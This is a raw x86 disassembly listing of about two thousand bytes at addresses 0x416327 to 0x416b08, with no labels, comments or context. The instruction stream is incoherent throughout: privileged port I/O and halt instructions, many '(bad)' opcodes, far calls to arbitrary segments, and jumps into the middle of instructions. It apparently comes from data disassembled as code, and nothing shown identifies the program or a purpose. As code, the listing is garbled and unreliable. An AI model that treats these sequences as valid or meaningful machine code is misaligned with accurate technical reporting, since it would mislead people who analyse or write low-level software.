  416327:	out    0xd0,eax
  416329:	pop    ebp
  41632a:	fild   DWORD PTR [esi+edi*1]
  41632d:	outs   dx,DWORD PTR ds:[esi]
  41632e:	lock pop DWORD PTR [ebx]
  416331:	lahf   
  416332:	mov    esp,0xff448d13
  416337:	mov    al,0x3a
  416339:	popa   
  41633a:	mov    bh,0xcf
  41633c:	js     0x416334
  41633e:	mov    cl,bh
  416340:	daa    
  416341:	jg     0x416390
  416343:	xchg   ebp,eax
  416344:	and    BYTE PTR [edi],cl
  416346:	mov    eax,ds:0x21304f31
  41634b:	dec    edi
  41634c:	pop    eax
  41634d:	inc    cx
  41634f:	loop   0x416320
  416351:	out    dx,al
  416352:	xor    eax,0x41ef7256
  416357:	ds jecxz 0x416357
  41635a:	mov    esp,0xf4dd8cfe
  41635f:	push   es
  416360:	inc    edi
  416361:	lds    esi,FWORD PTR [eax-0x3b279710]
  416367:	jo     0x416399
  416369:	add    eax,0xc631ea7
  41636e:	xor    al,0x38
  416370:	daa    
  416371:	es (bad) 
  416373:	pop    ss
  416374:	lock cmp BYTE PTR gs:[esi+ebx*2-0x1cf04f5f],ch
  41637d:	push   edx
  41637e:	push   edi
  41637f:	cdq    
  416380:	pop    edx
  416381:	(bad)  [edx-0x246c7252]
  416387:	inc    ecx
  416388:	js     0x416363
  41638a:	push   esi
  41638b:	repnz and BYTE PTR [edi-0x5],0xec
  416390:	mov    dh,0x94
  416392:	xor    BYTE PTR [eax+0x625b6fed],0xd2
  416399:	mov    BYTE PTR [ebx-0x6bf55d00],dl
  41639f:	sub    al,0x7c
  4163a1:	into   
  4163a2:	shr    DWORD PTR [ebp-0x6189f6d7],1
  4163a8:	mov    ah,0xe0
  4163aa:	inc    ebp
  4163ab:	jl     0x41634c
  4163ad:	sbb    cl,dl
  4163af:	jg     0x41634f
  4163b1:	rcl    BYTE PTR [edi],1
  4163b3:	cmp    eax,0x4689552c
  4163b8:	ror    BYTE PTR [ebx+0x353d8b4b],1
  4163be:	sub    edi,edi
  4163c0:	(bad)  
  4163c1:	jae    0x416373
  4163c3:	xor    dl,BYTE PTR [ecx]
  4163c5:	push   esi
  4163c6:	adc    al,BYTE PTR [edi]
  4163c8:	int3   
  4163c9:	mov    eax,ds:0xcff06383
  4163ce:	pop    eax
  4163cf:	pop    ds
  4163d0:	dec    edi
  4163d1:	mov    ah,0x28
  4163d3:	lods   al,BYTE PTR ds:[esi]
  4163d4:	and    ecx,ecx
  4163d6:	fsubr  st(4),st
  4163d8:	pop    ss
  4163d9:	sti    
  4163da:	mov    ss,WORD PTR [ebx-0x12]
  4163dd:	xlat   BYTE PTR ds:[ebx]
  4163de:	std    
  4163df:	mov    eax,DWORD PTR [ebp-0x25fbf617]
  4163e5:	jp     0x416456
  4163e7:	or     BYTE PTR [esi-0x16],ch
  4163ea:	cwde   
  4163eb:	in     al,0xbb
  4163ed:	xchg   edi,eax
  4163ee:	dec    esp
  4163ef:	in     al,dx
  4163f0:	push   ebx
  4163f1:	push   cs
  4163f2:	rcl    BYTE PTR [esi-0x80],1
  4163f5:	xchg   edi,eax
  4163f6:	mov    ecx,0x2a9d4e92
  4163fb:	out    0x76,eax
  4163fd:	daa    
  4163fe:	fcmovne st,st(4)
  416400:	fstp   QWORD PTR [edx]
  416402:	call   0x3fad7dcb
  416407:	sub    BYTE PTR [esi],bh
  416409:	test   BYTE PTR [edi],bh
  41640b:	popf   
  41640c:	xor    ebx,ecx
  41640e:	mov    bh,0x34
  416410:	test   al,0x67
  416412:	mov    WORD PTR [esi],?
  416414:	push   esp
  416415:	leave  
  416416:	cmp    ah,BYTE PTR [edi]
  416418:	es or  al,0x99
  41641b:	repnz (bad) [edi-0x52]
  41641f:	or     DWORD PTR [ecx-0x65cff36a],ecx
  416425:	pushf  
  416426:	mov    al,ds:0x88fa2b43
  41642b:	test   BYTE PTR [ebx],dl
  41642d:	mov    ebp,0xdb7c0614
  416432:	and    eax,0xefadf62e
  416437:	inc    ecx
  416438:	pop    ecx
  416439:	cmp    BYTE PTR [edi-0x71848a23],cl
  41643f:	cmp    ecx,DWORD PTR [edi+0x8]
  416442:	out    0x5f,eax
  416444:	cli    
  416445:	hlt    
  416446:	jecxz  0x4163f2
  416448:	popa   
  416449:	lahf   
  41644a:	(bad)  
  41644b:	or     al,BYTE PTR [esi+eiz*8]
  41644e:	in     eax,0xdb
  416450:	ficomp DWORD PTR [esi+0x271cc2c1]
  416456:	jne    0x41646d
  416458:	sti    
  416459:	test   al,0x0
  41645b:	dec    edx
  41645c:	outs   dx,BYTE PTR ds:[esi]
  41645d:	add    al,0x68
  41645f:	mov    ds:0x44a1bbee,al
  416464:	cli    
  416465:	xor    BYTE PTR [esi+0x53062a11],0xd6
  41646c:	inc    eax
  41646d:	add    esp,DWORD PTR [ebx+0xd]
  416470:	and    BYTE PTR [edi-0x22],bl
  416473:	scas   eax,DWORD PTR es:[edi]
  416474:	mov    al,0x4e
  416476:	pop    es
  416477:	imul   esi,DWORD PTR [ecx+0x7a],0x20
  41647b:	or     al,0x3
  41647d:	enter  0xacad,0xe4
  416481:	mov    ds:0x516e878f,eax
  416486:	cs (bad) 
  416488:	les    ebp,FWORD PTR [ecx-0x37890260]
  41648e:	mov    ch,dh
  416490:	pop    eax
  416491:	sub    al,0x44
  416493:	mov    ecx,0x6b55d77e
  416498:	jecxz  0x416442
  41649a:	inc    esp
  41649b:	jnp    0x416466
  41649d:	jp     0x4164d6
  41649f:	cmp    ebx,DWORD PTR [ebx-0x73]
  4164a2:	mov    eax,ds:0x1813dd8
  4164a7:	mov    al,0x5e
  4164a9:	jmp    0x4164cd
  4164ab:	xor    BYTE PTR [eax-0x2f],dl
  4164ae:	push   ebx
  4164af:	mov    dh,0xb
  4164b1:	mov    ds:0x21439661,eax
  4164b6:	and    al,ah
  4164b8:	xchg   DWORD PTR [ecx+0x4e],esi
  4164bb:	in     al,0x11
  4164bd:	(bad)  
  4164be:	mov    esp,0x802e9471
  4164c3:	add    BYTE PTR [esp+ecx*4+0x3b],dh
  4164c7:	popf   
  4164c8:	cs jl  0x41651b
  4164cb:	pop    edx
  4164cc:	jae    0x416507
  4164ce:	sbb    eax,0x48320d49
  4164d3:	imul   esi,DWORD PTR [ebp+eax*8+0x26b45fd2],0xffffffaf
  4164db:	push   ecx
  4164dc:	popf   
  4164dd:	pop    eax
  4164de:	xor    esi,0x63
  4164e1:	inc    ebx
  4164e2:	cs ins BYTE PTR es:[edi],dx
  4164e4:	les    ebx,FWORD PTR [eax-0xa]
  4164e7:	push   ebp
  4164e8:	push   ebx
  4164e9:	jns    0x41650a
  4164eb:	fsub   DWORD PTR [eax+esi*4+0x7f]
  4164ef:	xchg   BYTE PTR [ebp+0x79],ch
  4164f2:	sbb    DWORD PTR [eax+0x2d],ecx
  4164f5:	das    
  4164f6:	xor    DWORD PTR [edi+0x3d3237ec],edi
  4164fc:	les    ebx,FWORD PTR [edi+0x6c2d43a0]
  416502:	or     bl,ah
  416504:	mov    ds:0x5f3474a,eax
  416509:	test   DWORD PTR [esi+0x2d],0xdf82926e
  416510:	(bad)  [ebp+0x4f]
  416513:	mov    ecx,esp
  416515:	sti    
  416516:	aaa    
  416517:	mov    ch,0x84
  416519:	fdivr  QWORD PTR [ebx+ebx*4-0x41]
  41651d:	pop    ecx
  41651e:	into   
  41651f:	xchg   edi,eax
  416520:	or     DWORD PTR [edi-0x6de8037c],ecx
  416526:	fnsave [edx]
  416528:	adc    DWORD PTR [eax+0xb],esi
  41652b:	push   ebp
  41652c:	mov    al,ds:0x6440afa7
  416531:	inc    edi
  416532:	dec    DWORD PTR [ebx+0x69ba6974]
  416538:	xchg   esp,eax
  416539:	or     bl,ah
  41653b:	(bad)  
  41653d:	mov    ah,0x84
  41653f:	sub    BYTE PTR [ebp+0x55de6398],dl
  416545:	inc    eax
  416546:	adc    ch,BYTE PTR [eax+0x592ba2b]
  41654c:	inc    edx
  41654d:	and    ecx,DWORD PTR [edx+0x57]
  416550:	popf   
  416551:	mov    eax,ds:0x92ad06e1
  416556:	sbb    eax,0xbba0744d
  41655b:	cmp    al,0x39
  41655d:	mov    ebx,0x4b3efdd2
  416562:	pop    ds
  416563:	lea    ecx,[ebx+0x61]
  416566:	les    esi,FWORD PTR [ebx+0x1f8d3479]
  41656c:	retf   
  41656d:	inc    ecx
  41656e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41656f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416570:	(bad)  
  416571:	loopne 0x416588
  416573:	jecxz  0x41658c
  416575:	rcl    al,0x98
  416578:	lods   eax,DWORD PTR ds:[esi]
  416579:	scas   eax,DWORD PTR es:[edi]
  41657a:	or     al,BYTE PTR [ebp-0x30]
  41657d:	scas   eax,DWORD PTR es:[edi]
  41657e:	inc    ecx
  41657f:	dec    eax
  416580:	and    ch,bh
  416582:	add    eax,0x82fa0833
  416587:	pop    ds
  416588:	loopne 0x416539
  41658a:	push   ebx
  41658b:	or     al,bh
  41658d:	js     0x4165e6
  41658f:	into   
  416590:	lock nop
  416592:	sbb    al,0xe2
  416594:	inc    edx
  416595:	pop    ebx
  416596:	cmp    ebx,edi
  416598:	adc    DWORD PTR [ecx],esp
  41659a:	mov    BYTE PTR [ebx],cl
  41659c:	icebp  
  41659d:	ret    
  41659e:	jno    0x416616
  4165a0:	int3   
  4165a1:	dec    ebp
  4165a2:	outs   dx,BYTE PTR ds:[esi]
  4165a3:	cmp    BYTE PTR [ebx+0x712bab11],ch
  4165a9:	sbb    eax,0xeba4c35c
  4165ae:	xchg   ebp,eax
  4165af:	maskmovq mm4,(bad)
  4165b0:	mul    DWORD PTR [esi-0x2]
  4165b3:	or     eax,0x77f169d2
  4165b8:	pop    ebp
  4165b9:	je     0x41662f
  4165bb:	xlat   BYTE PTR ds:[ebx]
  4165bc:	pop    ds
  4165bd:	dec    esp
  4165be:	popf   
  4165bf:	fs add eax,0x77b3d6ae
  4165c5:	push   eax
  4165c6:	fwait
  4165c7:	push   ecx
  4165c8:	mov    esi,0x23fce8d0
  4165cd:	and    al,0x66
  4165cf:	pop    edx
  4165d0:	pop    eax
  4165d1:	in     al,0x2e
  4165d3:	sub    cl,BYTE PTR [esi+0x4e]
  4165d6:	retf   0x9b23
  4165d9:	in     eax,0xed
  4165db:	jl     0x41657e
  4165dd:	add    BYTE PTR [edx+0xec12afd],ah
  4165e3:	mov    bl,0xf6
  4165e5:	(bad)  [ebp-0x655df793]
  4165eb:	xchg   ebx,eax
  4165ec:	sbb    edi,DWORD PTR [edi+0x62cd4353]
  4165f2:	fidivr DWORD PTR [edx+0x7f699627]
  4165f8:	fadd   DWORD PTR [eax]
  4165fa:	lods   al,BYTE PTR ds:[esi]
  4165fb:	sbb    eax,0x2ad6553d
  416600:	and    ch,al
  416602:	nop
  416603:	pop    esp
  416604:	and    ebp,DWORD PTR [ecx+edi*1+0x5c]
  416608:	lea    edx,[ecx]
  41660a:	(bad)  
  41660b:	test   BYTE PTR [edx+esi*2],0xb8
  41660f:	outs   dx,DWORD PTR ds:[esi]
  416610:	stc    
  416611:	jo     0x416617
  416613:	jg     0x416686
  416615:	adc    DWORD PTR [edi-0x5c],0x7a
  416619:	xor    DWORD PTR [ebp+eiz*8+0x4ddbb0f3],ebp
  416620:	into   
  416621:	push   es
  416622:	mov    al,ds:0x4d959bbc
  416627:	out    0xee,eax
  416629:	adc    edi,DWORD PTR [ebx+0x6ed11f3]
  41662f:	mov    eax,ds:0x35105f00
  416634:	cs jbe 0x4166b2
  416637:	cs add eax,0xfda7141b
  41663d:	data16 icebp 
  41663f:	lock aaa 
  416641:	retf   0x418b
  416644:	jno    0x416629
  416646:	and    cl,BYTE PTR [edx+0x12ff6607]
  41664c:	cmc    
  41664d:	jecxz  0x416690
  41664f:	add    BYTE PTR [esi-0x2c638273],bh
  416655:	and    DWORD PTR [ebx+0x3c5d7f8e],0x2cb7fc75
  41665f:	fs iret 
  416661:	in     eax,0xd0
  416663:	jne    0x4166b3
  416665:	lds    ebp,FWORD PTR [ebp-0x5d]
  416668:	fwait
  416669:	mov    WORD PTR [ebp-0x22],fs
  41666c:	jo     0x41661b
  41666e:	push   cs
  41666f:	mov    esp,?
  416671:	mov    ebx,0x81932936
  416676:	stc    
  416677:	aam    0x14
  416679:	lods   al,BYTE PTR ds:[esi]
  41667a:	in     al,0x4d
  41667c:	ins    DWORD PTR es:[edi],dx
  41667d:	adc    al,0x83
  41667f:	out    dx,eax
  416680:	sti    
  416681:	in     eax,dx
  416682:	xchg   edi,eax
  416683:	mov    al,0x89
  416685:	sahf   
  416686:	and    dl,ah
  416688:	mov    dl,0x1
  41668a:	hlt    
  41668b:	mov    eax,DWORD PTR [ebx+0x179fe0d2]
  416691:	out    0xc7,eax
  416693:	ins    BYTE PTR es:[edi],dx
  416694:	push   ecx
  416695:	mov    esi,0x50a5464c
  41669a:	dec    eax
  41669b:	arpl   WORD PTR [ecx+0x16e5002e],sp
  4166a1:	mov    eax,ds:0xa3efc1fd
  4166a6:	or     DWORD PTR ds:0xe9dd0c8e,eax
  4166ac:	es mov ebx,0x2e69d8bd
  4166b2:	xor    al,dl
  4166b4:	and    cl,BYTE PTR [edx-0x27]
  4166b7:	out    0x84,eax
  4166b9:	add    cl,BYTE PTR [ebx+esi*8]
  4166bc:	out    0xfd,al
  4166be:	push   edi
  4166bf:	push   esp
  4166c0:	push   ds
  4166c1:	sub    al,0xc0
  4166c3:	jle    0x41666d
  4166c5:	(bad)  
  4166c6:	xor    esp,esi
  4166c8:	push   edi
  4166c9:	jnp    0x416719
  4166cb:	or     ah,ch
  4166cd:	push   ebp
  4166ce:	push   ds
  4166cf:	add    al,0x7
  4166d1:	test   al,0x79
  4166d3:	mov    ecx,0xc7ef3b9d
  4166d8:	dec    esp
  4166d9:	call   0x1cb6:0x7290a80c
  4166e0:	or     BYTE PTR [ebx+0x13],cl
  4166e3:	leave  
  4166e4:	cwde   
  4166e5:	mov    esp,0xad8100a2
  4166ea:	ficom  WORD PTR [ecx+0xa]
  4166ed:	xor    al,0xbc
  4166ef:	aad    0x35
  4166f1:	push   0xee8763a5
  4166f6:	mov    edi,0x898201b
  4166fb:	(bad)  
  4166fc:	(bad)  [ecx]
  4166fe:	gs lahf 
  416700:	xchg   ecx,eax
  416701:	push   ss
  416702:	xor    bl,BYTE PTR [edi+ebx*4]
  416705:	and    BYTE PTR [esi],bh
  416707:	imul   ecx,DWORD PTR [ecx-0x42b9239],0xe3782fe9
  416711:	and    al,0x9e
  416713:	pop    es
  416714:	adc    al,0xc4
  416716:	aaa    
  416717:	mov    ecx,0x3403e38a
  41671c:	ffree  st(1)
  41671e:	data16 and al,0xbb
  416721:	inc    edi
  416722:	fnstcw WORD PTR [ebp+0x73]
  416725:	aas    
  416726:	pop    eax
  416727:	dec    ebp
  416728:	pop    cx
  41672a:	sahf   
  41672b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41672c:	(bad)  
  41672d:	dec    ebp
  41672e:	add    DWORD PTR [edi+0x53],0x3c
  416732:	sub    bh,BYTE PTR [esi+0x2c]
  416735:	(bad)  [edx+0x0]
  416738:	push   esi
  416739:	pop    ebp
  41673a:	mov    ebp,0xc1c91ccc
  41673f:	or     BYTE PTR [ecx],al
  416741:	lahf   
  416742:	les    ecx,FWORD PTR [eiz*2-0x562da2eb]
  416749:	addr16 push cs
  41674b:	mov    al,0x74
  41674d:	mov    WORD PTR [esi],es
  41674f:	jle    0x4167ae
  416751:	add    eax,0x5af15f17
  416756:	fidiv  WORD PTR [esp+eiz*8-0x7b]
  41675a:	jmp    0x416718
  41675c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41675d:	mov    DWORD PTR ds:0x8fd3d1e0,esp
  416763:	and    eax,0x9a0d33b
  416768:	mov    dh,BYTE PTR [edx+0x52b3c529]
  41676e:	stc    
  41676f:	pop    esp
  416770:	mov    ebx,0x12af736f
  416775:	stos   DWORD PTR es:[edi],eax
  416776:	xchg   ebx,eax
  416777:	das    
  416778:	imul   esi,DWORD PTR [ecx-0x6b088593],0xffffff82
  41677f:	jge    0x4167df
  416781:	dec    DWORD PTR [ebx]
  416783:	loopne 0x4167f5
  416785:	push   edx
  416786:	fld    DWORD PTR [eax+eiz*1-0x3c2bd3ea]
  41678d:	or     eax,0x61028f74
  416792:	shr    BYTE PTR [ebx],0x16
  416795:	and    edi,DWORD PTR [ebx]
  416797:	das    
  416798:	(bad)  
  416799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41679a:	pop    eax
  41679b:	jecxz  0x4167eb
  41679d:	sub    dl,BYTE PTR [edi-0x7286a8ce]
  4167a3:	ret    0x2a76
  4167a6:	out    0x8a,al
  4167a8:	push   ss
  4167a9:	dec    ebp
  4167aa:	(bad)  
  4167ab:	fcomi  st,st(0)
  4167ad:	or     eax,0x2f2e77d9
  4167b2:	sbb    eax,0x8353d6c1
  4167b7:	add    dl,BYTE PTR [ebp-0x1]
  4167ba:	ret    
  4167bb:	sar    BYTE PTR [edi+0x6c],0x50
  4167bf:	cmc    
  4167c0:	push   ecx
  4167c1:	cmp    eax,DWORD PTR [ecx]
  4167c3:	add    al,0x9c
  4167c5:	call   0x3ae8:0xecb9bb0d
  4167cc:	imul   edx,ebx,0xffffff81
  4167cf:	lds    edx,FWORD PTR [ecx-0x62]
  4167d2:	pop    edi
  4167d3:	pop    ss
  4167d4:	mov    edi,ebx
  4167d6:	push   ds
  4167d7:	adc    ebx,0x6aa20da4
  4167dd:	sub    ah,BYTE PTR [ecx]
  4167df:	push   esp
  4167e0:	outs   dx,DWORD PTR ds:[esi]
  4167e1:	jbe    0x4167bf
  4167e3:	repz sbb al,0x9f
  4167e6:	test   BYTE PTR [eax-0x18f0dede],0x6a
  4167ed:	outs   dx,BYTE PTR ds:[esi]
  4167ee:	or     cl,BYTE PTR [ebx+0x26]
  4167f1:	cwde   
  4167f2:	fst    st(2)
  4167f4:	mov    edi,0xd814f74f
  4167f9:	je     0x416835
  4167fb:	jmp    0x416846
  4167fd:	push   ds
  4167fe:	push   eax
  4167ff:	lods   eax,DWORD PTR ds:[esi]
  416800:	out    0xe5,al
  416802:	jne    0x4167c4
  416804:	jns    0x4167d5
  416806:	out    dx,al
  416807:	out    dx,eax
  416808:	push   edx
  416809:	fcom   QWORD PTR [edi+edi*4-0xb]
  41680d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41680e:	pop    esp
  41680f:	cdq    
  416810:	inc    edx
  416811:	mov    WORD PTR [esi+0x9],?
  416814:	into   
  416815:	fcomp  st(5)
  416817:	mov    edi,0x571189d
  41681c:	aad    0x77
  41681e:	and    ebp,DWORD PTR [ebp+0x3c]
  416821:	inc    esi
  416822:	jmp    0x4167c5
  416824:	or     DWORD PTR [ebp+0x335b83a9],ebp
  41682a:	ins    DWORD PTR es:[edi],dx
  41682b:	or     BYTE PTR [eax],dh
  41682d:	loope  0x416887
  41682f:	pop    eax
  416830:	pop    ebp
  416831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416832:	mov    ds:0xf78b4c77,eax
  416837:	dec    ecx
  416838:	dec    DWORD PTR [ebp+0x5824ab77]
  41683e:	cs xor eax,0x857a476f
  416844:	out    0x67,al
  416846:	lea    ebx,[eax+0x7e]
  416849:	aaa    
  41684a:	mov    ch,0x69
  41684c:	cmc    
  41684d:	nop
  41684e:	retf   0x3bd9
  416851:	shr    DWORD PTR [eax],1
  416853:	push   ss
  416854:	or     eax,0xfcf046e7
  416859:	xlat   BYTE PTR ds:[ebx]
  41685a:	ror    BYTE PTR [ebp+0x18],0x7d
  41685e:	inc    ecx
  41685f:	out    dx,eax
  416860:	mov    dh,0x3
  416862:	pushaw 
  416864:	ret    
  416865:	out    0x8b,eax
  416867:	fwait
  416868:	pop    ecx
  416869:	pop    ss
  41686a:	loope  0x4168b8
  41686c:	lods   al,BYTE PTR ds:[esi]
  41686d:	loope  0x41681c
  41686f:	dec    edx
  416870:	pop    ecx
  416871:	or     ebp,DWORD PTR ds:0x331f34e1
  416877:	ficom  DWORD PTR [ecx-0x29c56923]
  41687d:	dec    ecx
  41687e:	popa   
  41687f:	ja     0xae92e115
  416885:	jo     0x416830
  416887:	sbb    DWORD PTR [edi+0x25],ebx
  41688a:	fbstp  TBYTE PTR [esi]
  41688c:	pop    eax
  41688d:	push   esp
  41688e:	sti    
  41688f:	sbb    eax,0xda0fb68c
  416894:	lock ins BYTE PTR es:[edi],dx
  416896:	xor    al,0xc3
  416898:	int    0xbd
  41689a:	lahf   
  41689b:	call   0xd608:0xd3d10758
  4168a2:	lods   al,BYTE PTR ds:[esi]
  4168a3:	xor    DWORD PTR [edi-0x53133a85],ebx
  4168a9:	lods   eax,DWORD PTR ds:[esi]
  4168aa:	popa   
  4168ab:	test   al,0xa0
  4168ad:	mov    BYTE PTR [edx+0x61],dh
  4168b0:	adc    BYTE PTR [eax-0x22],dl
  4168b3:	push   ebp
  4168b4:	mov    bl,0xc
  4168b6:	and    eax,0xa27e52a8
  4168bb:	(bad)  
  4168bc:	pop    ds
  4168bd:	mov    ebp,0xa524f7e7
  4168c2:	je     0x41686b
  4168c4:	xchg   BYTE PTR [esi+0xc],dl
  4168c7:	xchg   ecx,eax
  4168c8:	adc    cl,BYTE PTR [ebp+0x62]
  4168cb:	jmp    0xb67:0x91c24160
  4168d2:	xor    BYTE PTR ds:0xbaa6f78b,ch
  4168d8:	jno    0x4168ff
  4168da:	je     0x416959
  4168dc:	xchg   BYTE PTR [ebp+0x7df07da2],ch
  4168e2:	dec    ebx
  4168e3:	js     0x416868
  4168e5:	pop    ss
  4168e6:	adc    al,0xc6
  4168e8:	cmc    
  4168e9:	cs xchg ebp,eax
  4168eb:	fst    DWORD PTR [esi-0x4]
  4168ee:	mov    BYTE PTR [ebp+edi*1+0xfaaa10f],bl
  4168f5:	mov    ah,0x10
  4168f7:	pop    edx
  4168f8:	arpl   WORD PTR [eax+0x790ea19d],ax
  4168fe:	icebp  
  4168ff:	mov    ah,0x84
  416901:	je     0x4168f5
  416903:	add    al,0xc1
  416905:	stos   BYTE PTR es:[edi],al
  416906:	hlt    
  416907:	clc    
  416908:	icebp  
  416909:	push   ebx
  41690a:	add    BYTE PTR [ebp-0x7a0c8130],cl
  416910:	pop    ss
  416911:	imul   ebx,edx,0x84c3c797
  416917:	add    ebp,DWORD PTR [edx]
  416919:	xchg   ebx,eax
  41691a:	aaa    
  41691b:	dec    esi
  41691c:	dec    esi
  41691d:	mov    DWORD PTR [edi+0x65c5b1c4],0x9b87c730
  416927:	sbb    eax,0x1be8fbcd
  41692c:	aam    0xa2
  41692e:	adc    eax,0x6b1c42ee
  416933:	and    cl,BYTE PTR [eax+0x57]
  416936:	xor    DWORD PTR [eax+0x2d],edi
  416939:	lods   eax,DWORD PTR ds:[esi]
  41693a:	jmp    0x4e5f:0x4d1fa961
  416941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416942:	mov    al,0xed
  416944:	pop    bp
  416946:	(bad)  
  416947:	rol    DWORD PTR [edi],cl
  416949:	in     eax,dx
  41694a:	arpl   WORD PTR [eax+eiz*1-0x42],sp
  41694e:	in     al,0x43
  416950:	repz push ebp
  416952:	mov    al,ds:0xab6113c4
  416957:	pop    ecx
  416958:	xlat   BYTE PTR ds:[ebx]
  416959:	adc    esp,ecx
  41695b:	mov    eax,DWORD PTR [edx+0x3c286b65]
  416961:	stc    
  416962:	popf   
  416963:	mov    esp,0x9a2029af
  416968:	cmc    
  416969:	cmp    ebp,0xffffffe2
  41696c:	js     0x416983
  41696e:	out    dx,al
  41696f:	out    0x62,al
  416971:	xchg   edi,eax
  416972:	mov    ebx,0xb6382dca
  416977:	add    bh,cl
  416979:	push   edx
  41697a:	inc    ebp
  41697b:	fdiv   DWORD PTR [ebx+0x61]
  41697e:	or     DWORD PTR [edi+eiz*1],ebx
  416981:	leave  
  416982:	sub    DWORD PTR [eax+0x2b887a18],esi
  416988:	js     0x416922
  41698a:	data16 or bh,BYTE PTR [edx+edx*4+0x55]
  41698f:	in     eax,dx
  416990:	mov    al,0xbd
  416992:	add    dh,cl
  416994:	adc    al,0x0
  416996:	cmp    al,0x5d
  416998:	pusha  
  416999:	aas    
  41699a:	(bad)  
  41699b:	jbe    0x416953
  41699d:	inc    eax
  41699e:	(bad)  [eax-0x13]
  4169a1:	retf   
  4169a2:	jne    0x4169d8
  4169a4:	xchg   esi,eax
  4169a5:	enter  0x454b,0x1c
  4169a9:	and    BYTE PTR [ebp+0x53910e4a],bl
  4169af:	dec    esp
  4169b0:	out    dx,eax
  4169b1:	ins    BYTE PTR es:[edi],dx
  4169b2:	outs   dx,BYTE PTR ds:[esi]
  4169b3:	push   ss
  4169b4:	xor    DWORD PTR [ebx],0xbc2422ec
  4169ba:	mov    DWORD PTR [ebp-0x3f],esp
  4169bd:	pop    edx
  4169be:	iret   
  4169bf:	mov    ecx,0xf1e1717c
  4169c4:	mov    ebp,0xa26e3fb6
  4169c9:	lahf   
  4169ca:	sbb    eax,0xffffffa5
  4169cd:	mov    bh,0xee
  4169cf:	scas   al,BYTE PTR es:[edi]
  4169d0:	xchg   edx,eax
  4169d1:	imul   eax,DWORD PTR [eax-0x3c],0x99a6281b
  4169d8:	repnz inc edi
  4169da:	mov    al,0x44
  4169dc:	(bad)  
  4169dd:	jns    0x416a03
  4169df:	jne    0x416a3e
  4169e1:	cmp    eax,0x5c964c3f
  4169e6:	and    BYTE PTR [edx],bl
  4169e8:	ret    
  4169e9:	push   ss
  4169ea:	je     0x416a1c
  4169ec:	mov    cs,WORD PTR [ecx-0x51]
  4169ef:	ret    
  4169f0:	mov    WORD PTR [edi-0x4e3ae1be],es
  4169f6:	pop    eax
  4169f7:	aas    
  4169f8:	retf   0x32b4
  4169fb:	pop    edi
  4169fc:	ret    0x4794
  4169ff:	cmp    esi,DWORD PTR [ebp+eax*8-0x5f89b0bc]
  416a06:	ds mov cl,0x47
  416a09:	sub    bl,BYTE PTR [eax-0x381843c0]
  416a0f:	mov    ds:0xa92d2a32,al
  416a14:	rcr    BYTE PTR [eax+0x61],0xa8
  416a18:	jmp    0x303:0xfac7fdbd
  416a1f:	test   al,0x3
  416a21:	add    DWORD PTR [edi*1-0x5cf5155e],0x26
  416a29:	dec    ebx
  416a2a:	jl     0x416a9e
  416a2c:	fstp   QWORD PTR [eax-0x370890e2]
  416a32:	cmp    DWORD PTR [edx-0x3b],esi
  416a35:	inc    ecx
  416a36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a37:	test   al,0xf4
  416a39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a3b:	das    
  416a3c:	out    dx,al
  416a3d:	or     ecx,esp
  416a3f:	inc    ebx
  416a40:	or     DWORD PTR [ecx+0x78080d23],0x1ce948fb
  416a4a:	mov    bh,0x69
  416a4c:	mov    dl,0x4f
  416a4e:	or     BYTE PTR [edx+esi*8-0x5a],0xab
  416a53:	mov    ds:0x6e8556d0,eax
  416a58:	push   edi
  416a59:	ds cmc 
  416a5b:	push   es
  416a5c:	cmp    ch,BYTE PTR [edi-0x6f]
  416a5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a60:	mov    esp,0x9e3f338a
  416a65:	shl    DWORD PTR [esi-0x905a8a7],0xae
  416a6c:	popa   
  416a6d:	call   0xb7f06dc1
  416a72:	push   ds
  416a73:	idiv   DWORD PTR [esi-0x7bb86f36]
  416a79:	(bad)  
  416a7a:	test   BYTE PTR [esi],0x13
  416a7d:	push   0x15a91491
  416a82:	ds dec edi
  416a84:	inc    ecx
  416a85:	leave  
  416a86:	push   ecx
  416a87:	iret   
  416a88:	adc    eax,0x490d1ee0
  416a8d:	mov    BYTE PTR [esi+0x6],cl
  416a90:	inc    esi
  416a91:	or     eax,0x6413d27e
  416a96:	cld    
  416a97:	stc    
  416a98:	sbb    BYTE PTR [esp+eiz*8],ah
  416a9b:	cmp    al,0xa
  416a9d:	inc    eax
  416a9e:	adc    ecx,DWORD PTR [esi]
  416aa0:	bound  edx,QWORD PTR [edx+0x495157e]
  416aa6:	fwait
  416aa7:	and    eax,0x6684e145
  416aac:	inc    edx
  416aad:	and    BYTE PTR [ecx+eiz*1],dl
  416ab0:	mov    dl,0x3
  416ab2:	add    edx,ebp
  416ab4:	call   0x81dcfc3e
  416ab9:	pop    ds
  416aba:	mov    ebp,eax
  416abc:	mov    ds:0x77a21e2f,al
  416ac1:	mov    edx,0xbc390719
  416ac6:	jmp    DWORD PTR [ecx-0x70]
  416ac9:	dec    edx
  416aca:	push   ebx
  416acb:	test   eax,0x8c2c2880
  416ad0:	(bad)  
  416ad1:	ficomp DWORD PTR [ebx+0x59]
  416ad4:	(bad)  
  416ad5:	adc    eax,0x8e57306a
  416ada:	add    ebx,DWORD PTR [ebx]
  416adc:	dec    ebx
  416add:	xchg   edi,eax
  416ade:	rcr    cl,0x49
  416ae1:	stos   BYTE PTR es:[edi],al
  416ae2:	loope  0x416b57
  416ae4:	cwde   
  416ae5:	and    eax,ebx
  416ae7:	pusha  
  416ae8:	cmc    
  416ae9:	test   BYTE PTR [ebx-0x1f5202d6],dh
  416aef:	outs   dx,DWORD PTR ds:[esi]
  416af0:	push   0xffffffa1
  416af2:	and    eax,0x10f2f350
  416af7:	rcl    BYTE PTR [edx],1
  416af9:	push   0xffffffc3
  416afb:	lods   al,BYTE PTR ds:[esi]
  416afc:	mov    edx,0xd2d4d5c5
  416b01:	fwait
  416b02:	rcr    DWORD PTR [esi+edi*2+0x16],1
  416b06:	and    BYTE PTR [ebx],bl
  416b08:	pop    ds
